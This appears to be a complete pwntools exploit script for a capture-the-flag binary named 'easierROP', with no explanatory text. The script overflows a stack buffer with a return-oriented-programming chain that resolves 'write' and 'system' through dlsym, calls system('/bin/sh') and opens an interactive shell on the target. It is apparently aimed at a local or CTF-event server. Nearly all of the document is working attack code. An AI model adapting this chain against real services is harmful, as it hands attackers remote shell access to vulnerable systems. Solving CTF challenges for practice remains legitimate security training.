# by chifeng
from pwn import *
context.arch = 'amd64'
libc = ELF('./libc.so.6')

#  r = remote('ais3eof.zoolab.org', 19091)
r = remote('localhost', 1111)
# r = process('./easierROP', env={'LD_PRELOAD': './libc.so.6'})
# gdb.attach(r, 'peda\nhandle SIGALRM ignore\nset detach-on-fork off')
# gdb.attach(r, 'peda\nhandle SIGALRM ignore\nset follow-fork-mode parent')
# gdb.attach(r)

pop_rdi_ret = 0x0000000000400cb3
pop_rsi_r15_ret = 0x0000000000400cb1
ret = 0x00000000004006f6
jmp_rax = 0x00000000004007e1
csu_mid = 0x400caa
csu_top = 0x400c90
exit_plt = 0x400720
exit_got = 0x601fc0
dlsym_plt = 0x400770
funcs = 0x6020c0

buf = flat(
    'a'*(0x7fffffffdb28 - 0x7fffffffdaf0),

    # rax = dlsym(0, "write")
    pop_rdi_ret, 0,
    pop_rsi_r15_ret, 0x6022E0, 0,
    dlsym_plt,

    # rax(1, buf+0x400, 0x400)
    csu_mid, 0, 1, 0x6022E0+8, 1, 0x6022E0, 0x400, csu_top,

    # add    rsp,0x8
    0,

    # exit(0xde)
    0, 1, exit_got, 0xde, 0, 0, csu_top,

).ljust(0x200) + flat(
    'write'.ljust(8, '\x00'), # for dlsym() , child
    jmp_rax,
    'system'.ljust(8, '\x00'), # for dlsym() , parent
    '/bin/sh'.ljust(8, '\x00'),
    'a'*(0x7fffffffdb28 - 0x7fffffffdaf0 - 8 - 8 - 8 - 8),

    # rax = dlsym(0, "system")
    pop_rdi_ret, 0,
    pop_rsi_r15_ret, 0x6022E0+16, 0,
    dlsym_plt,

    # stack aligning
    ret,

    # rax("/bin/sh")
    pop_rdi_ret, 0x6022E0+24,
    jmp_rax,
)

pause()
r.send(buf)

r.interactive()
